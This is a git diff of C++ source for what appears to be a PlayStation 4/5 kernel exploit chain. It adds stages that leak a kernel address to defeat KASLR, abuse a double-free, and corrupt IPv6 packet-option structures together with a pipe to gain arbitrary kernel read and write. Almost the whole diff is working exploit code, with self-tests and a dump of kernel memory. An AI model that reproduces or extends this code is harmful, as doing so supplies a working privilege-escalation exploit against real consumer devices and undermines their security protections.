@@ -18,6 +18,8 @@ along with this program.  If not, see <https://www.gnu.org/licenses/>. */
 #include <mast1c0re.hpp>
 #include "../helpers/helpers.cpp"
 #include "../helpers/ruby_chan.cpp"
+#include "../helpers/kernel_memory.cpp"
+#include "../helpers/offsets.cpp"
 
 int32_t err = 0; // Global error variable
 
@@ -684,13 +686,13 @@ int32_t leak_kernel_addrs()
 
     // evf.cv.cv_description = "evf cv"
     // The string is located at the kernel's mapped ELF file
-    // "evf cv" offset is 0x007b5133 for FW 10.01.
     stage2_data.evf_cv_str_p = *(uint64_t*)(&stage2_data.buf[0x28]);
-
     printf_debug("\"evf cv\" string address found! %p\n",
         stage2_data.evf_cv_str_p);
-    printf_debug("DEFEATED KASLR! Kernel base (10.01): %p\n",
-        stage2_data.evf_cv_str_p - 0x007b5133);
+
+    // "evf cv" offset from kernel base is defined as EVF_OFFSET
+    printf_debug("DEFEATED KASLR! Kernel base for FW (%d): %p\n",
+        FIRMWARE, stage2_data.evf_cv_str_p - EVF_OFFSET);
 
     // Because of TAILQ_INIT() (a linked list macro), we have:
     // evf.waiters.tqh_last == &evf.waiters.tqh_first (closed loop)
@@ -1044,18 +1046,12 @@ int32_t double_free_reqs1()
     return 0;
 }
 
-#if defined(PS4)
-#define TCLASS_OFFSET 0xb0
-#elif defined(PS5)
-#define TCLASS_OFFSET 0xc0
-#endif
-
 uint64_t kread64(ptr64_t addr)
 {
     ptr64_t pktinfo_p = stage2_data.reqs1 + 0x10;
     uint8_t pktinfo[0x14] = {0};
     // pktinfo.ip6po_pktinfo = &pktinfo.ip6po_pktinfo
-    // This needed again to prevent `setsockopt` from overwriting
+    // This is needed again to prevent `setsockopt` from overwriting
     // the `pktinfo_p` pointer we set earlier.
     *(uint64_t*)pktinfo = pktinfo_p;
 
@@ -1072,7 +1068,7 @@ uint64_t kread64(ptr64_t addr)
         *(uint64_t*)&pktinfo[0x8] = addr + offset;
         nhop = len - offset;
 
-        err = PS::setsockopt(
+        PS::setsockopt(
             pktopts_sds[0], IPPROTO_IPV6, IPV6_PKTINFO, pktinfo, sizeof(pktinfo)
         );
 
@@ -1080,19 +1076,20 @@ uint64_t kread64(ptr64_t addr)
             pktopts_sds[0], IPPROTO_IPV6, IPV6_NEXTHOP, read_buf + offset, &nhop
         );
 
-        printf_debug("offset: %d nhop: %d read_buf: %02x %02x %02x %02x %02x %02x %02x %02x\n",
-            nhop, offset,
-            read_buf[0], read_buf[1],
-            read_buf[2], read_buf[3],
-            read_buf[4], read_buf[5],
-            read_buf[6], read_buf[7]
-        );
-
         if (nhop == 0) read_buf[offset++] = 0; // Fallbacks to 0
         else offset += nhop;
     }
 
     return *(uint64_t*)read_buf;
+}
+
+ptr64_t locate_pktopts(int32_t sd, ptr64_t ofiles)
+{
+    ptr64_t file = kread64(ofiles + (sd * SIZEOF_OFILES));
+    ptr64_t sock = kread64(file + FILE_FDATA);
+    ptr64_t pcb = kread64(sock + SOCK_PCB);
+    ptr64_t pktopts = kread64(pcb + PCB_PKTINFO);
+    return pktopts;
 }
 
 int32_t make_kernel_arw()
@@ -1162,6 +1159,126 @@ int32_t make_kernel_arw()
     printf_debug("Test read `pktinfo_p`: 0x%08x%08x\n",
         (uint32_t)(value >> 32), (uint32_t)value);
 
+    if (value != pktinfo_p)
+    {
+        printf_debug("Test read failed!\n");
+        return -1;
+    }
+
+    printf_debug("* Achieved restricted read!\n");
+
+    ptr64_t kernel_base = stage2_data.evf_cv_str_p - EVF_OFFSET;
+
+    // Finding the current process structure
+    // `ar2_info` object should have its address at offset 8, assuming
+    // that it hasn't been overwritten after being freed.
+    ptr64_t proc = kread64(stage2_data.req2->ar2_info + 8);
+    // Check if we got a valid proc address
+    if (proc >> 8*6 != 0xffff)
+    {
+        printf_debug("Invalid proc address!\n");
+        return -1;
+    }
+    if ((uint32_t)kread64(proc + PROC_PID) != PS::getpid())
+    {
+        printf_debug("Invalid proc address!\n");
+        return -1;
+    }
+    printf_debug("proc: 0x%08x%08x\n",
+        (uint32_t)(proc >> 32), (uint32_t)proc);
+
+    // Locating file descriptors
+    ptr64_t proc_fd = kread64(proc + PROC_FD);
+    printf_debug("proc_fd: 0x%08x%08x\n",
+        (uint32_t)(proc_fd >> 32), (uint32_t)proc_fd);
+    ptr64_t proc_ofiles = kread64(proc_fd + FILEDESC_OFILES);
+    printf_debug("proc_ofiles: 0x%08x%08x\n",
+        (uint32_t)(proc_ofiles >> 32), (uint32_t)proc_ofiles);
+
+    // Creating a pipe as a primitive for arbitrary read/write
+    int32_t pipe_fds[2] = {-1, -1};
+    create_pipe(pipe_fds);
+
+    // Locating the pipe file
+    ptr64_t pipe_file = kread64(proc_ofiles + (pipe_fds[0] * SIZEOF_OFILES));
+    printf_debug("pipe_file: 0x%08x%08x\n",
+        (uint32_t)(pipe_file >> 32), (uint32_t)pipe_file);
+
+    ptr64_t pipe_p = kread64(pipe_file + FILE_FDATA);
+    printf_debug("pipe_p: 0x%08x%08x\n",
+        (uint32_t)(pipe_p >> 32), (uint32_t)pipe_p);
+    
+    // Backing up pipebuf for later restoration
+    uint8_t pipe_buf[SIZEOF_PIPEBUF] = {0};
+    for (uint32_t i = 0; i < SIZEOF_PIPEBUF; i++)
+        pipe_buf[i] = kread64(pipe_p + i);
+
+    // Obtaining pktopts addresses
+    ptr64_t pktopts_p = locate_pktopts(pktopts_sds[0], proc_ofiles);
+    printf_debug("pktopts_p: 0x%08x%08x\n",
+        (uint32_t)(pktopts_p >> 32), (uint32_t)pktopts_p);
+    if (pktopts_p != stage2_data.reqs1)
+    {
+        printf_debug("pktopts_p doesn't match reqs1!\n");
+        return -1;
+    }
+    ptr64_t r_pktopts_p = locate_pktopts(reclaim_sd, proc_ofiles);
+    printf_debug("r_pktopts_p: 0x%08x%08x\n",
+        (uint32_t)(r_pktopts_p >> 32), (uint32_t)r_pktopts_p);
+    ptr64_t d_pktopts_p = locate_pktopts(dirty_sd, proc_ofiles);
+    printf_debug("d_pktopts_p: 0x%08x%08x\n",
+        (uint32_t)(d_pktopts_p >> 32), (uint32_t)d_pktopts_p);
+
+    // Getting restricted read/write with pktopts pair
+    uint8_t pktinfo[0x14] = {0};
+    // pktopts_p.ip6po_pktinfo = &d_pktopts_p.ip6po_pktinfo
+    *(uint64_t*)pktinfo = d_pktopts_p + 0x10;
+    
+    // After this, calling setsockopt/IPV6_PKTINFO for pktopts_p would set
+    // the pointer of d_pktopts_p's pktopts object to any address we want,
+    // making it acting as a reading/writing head.
+    // Calling getsockopts/IPV6_PKTINFO or setsockopt/IPV6_PKTINFO for
+    // d_pktopts_p would read from or write to the address we set.
+    PS::setsockopt(
+        pktopts_sds[0], IPPROTO_IPV6, IPV6_PKTINFO, pktinfo, sizeof(pktinfo)
+    );
+
+    // Test write
+    uint8_t write_buf[0x14] = {0};
+
+    *(uint64_t*)pktinfo = PVAR_TO_NATIVE(write_buf);
+    PS::setsockopt(
+        pktopts_sds[0], IPPROTO_IPV6, IPV6_PKTINFO, pktinfo, sizeof(pktinfo)
+    );
+
+    *(uint64_t*)pktinfo = 0x4242424213371337;
+    PS::setsockopt(
+        dirty_sd, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo, sizeof(pktinfo)
+    );
+
+    printf_debug("Test write: 0x%08x%08x\n",
+        *(uint32_t*)(write_buf + 4), *(uint32_t*)(write_buf)
+    );
+
+    if (*(uint64_t*)(write_buf) != *(uint64_t*)(pktinfo))
+    {
+        printf_debug("Test write failed!\n");
+        return -1;
+    }
+
+    printf_debug("* Achieved restricted write!\n");
+
+    Kernel_Memory kernel_memory = Kernel_Memory(pktopts_sds[0], dirty_sd, pipe_fds, pipe_p);
+    printf_debug("* Kernel_Memory initialized!\n");
+
+    uint8_t kbuf[0x500] = {0};
+
+    // Test read/write
+    kernel_memory.copyout(kernel_base, kbuf, sizeof(kbuf));
+    printf_debug("Test read from kernel base\n");
+    hexdump(kbuf, 0x500);
+
+    printf_debug("* Achieved arbitrary kernel read/write!\n");
     return 0;
 }
 
@@ -1212,7 +1329,7 @@ void main()
     PS::Breakout::init();
 
     // Attempt to connect to debug server
-    PS::Debug.connect(IP(192, 168, 1, 38), 9023);
+    PS::Debug.connect(IP(192, 168, 1, 35), 9023);
 
     // HELLO EVERYNYAN!
     Okage::printf("HELL%d\nEVERYNYAN!\n", 0);
@@ -1221,6 +1338,7 @@ void main()
     // Initialize syscall wrappers
     syscall_init();
 
+    // TODO: Fix this mess !!!
     // STAGE 0: Setup
     if (setup() != 0) goto end;
 
@@ -1234,7 +1352,7 @@ void main()
     if (double_free_reqs1() != 0) goto end;
 
     // STAGE 4: Get arbitrary kernel read/write
-    if (make_kernel_arw() != 0) goto end;
+    if ((err = make_kernel_arw()) != 0) goto end;
 
     end:
         cleanup();
